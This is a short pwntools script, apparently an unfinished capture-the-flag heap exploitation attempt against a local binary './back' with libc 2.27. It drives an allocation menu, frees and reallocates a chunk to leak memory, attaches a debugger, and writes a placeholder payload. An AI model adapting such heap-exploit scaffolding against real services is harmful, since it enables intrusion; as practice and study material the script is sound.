from pwn import *

io = process("./back",env={"LD_PRELOAD":"./libc-2.27.so"})


def add(idx,size):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Index: ",str(idx))
    io.sendlineafter("Size: ",str(size))

def edit(idx,content,loop=0):
    io.sendlineafter("Your choice: ","2")
    io.sendlineafter("Index: ",str(idx))
    #for _ in range(loop):
    io.sendline(str(content))
    #io.sendline(str(0xdeadbeef))

def view(idx):
    io.sendlineafter("Your choice: ","3")
    io.sendlineafter("Index: ",str(idx))

def delete(idx):
    io.sendlineafter("Your choice: ","4")
    io.sendlineafter("Index: ",str(idx))


add(0,500)
add(1,4)
delete(0)
add(0,500)
view(0)
gdb.attach(io)

payload = 0xcafebabecafebabe

edit(1,payload)
io.interactive()
